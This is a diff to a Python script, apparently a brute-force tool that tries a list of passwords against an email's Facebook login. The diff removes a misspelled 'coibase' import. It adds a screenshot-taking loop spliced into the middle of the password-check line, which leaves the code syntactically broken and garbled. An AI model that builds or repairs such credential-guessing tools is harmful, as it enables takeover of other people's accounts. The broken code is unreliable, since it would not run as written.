@@ -2,7 +2,6 @@ import os.path
 import requests
 from bs4 import BeautifulSoup
 import sys
-import coibase 
 if sys.version_info[0] != 3:
     print('''\t--------------------------------------\n\t\tREQUIRED PYTHON 3.x\n\t\tinstall and try: python3 
     fb.py\n\t--------------------------------------''')
@@ -58,5 +57,13 @@ if __name__ == "__main__":
         if len(password) < MIN_PASSWORD_LENGTH:
             continue
         print("Trying password [", index, "]: ", password)
-        if is_this_a_password(email, index, password):
+        if is_this_a_password(email, index, password):import pyautogui
+import time 
+for i in range(1,10+1): 
+       foto=pyautogui.screenshot()
+       time.sleep(5)
+        foto.save
+        print("Working %d (i))
+print("Worked") 
+            
             break
